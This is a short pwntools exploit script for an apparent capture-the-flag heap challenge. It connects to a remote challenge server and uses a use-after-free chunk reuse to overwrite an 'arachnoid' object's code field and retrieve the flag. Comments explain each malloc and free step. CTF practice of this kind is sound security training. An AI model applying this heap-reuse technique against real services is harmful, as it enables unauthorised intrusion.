from pwn import *

conn = remote("167.172.49.117", 30888)

# Create an arachnoid with name dummy.
# name = malloc(0x28)
# code = malloc(0x28)
conn.sendlineafter(b"> ", b"1")
conn.sendlineafter(b"Name: ", b"dummy")

# Delete the first arachnoid.
# free(name)
# free(code)
conn.sendlineafter(b"> ", b"2")
conn.sendlineafter(b"Index: ", b"0")

# Create a new arachnoid with name sp1d3y which will
# overwrite the first arachnoid's code.
# new_name = malloc(0x28) = code
# new_code = malloc(0x28) = name
conn.sendlineafter(b"> ", b"1")
conn.sendlineafter(b"Name: ", b"sp1d3y")

# Obtain the flag with the first arachnoid.
conn.sendlineafter(b"> ", b"4")
conn.sendlineafter(b"Arachnoid: ", b"0")

# Show the flag.
conn.recvline()
log.success(conn.recvlineS())
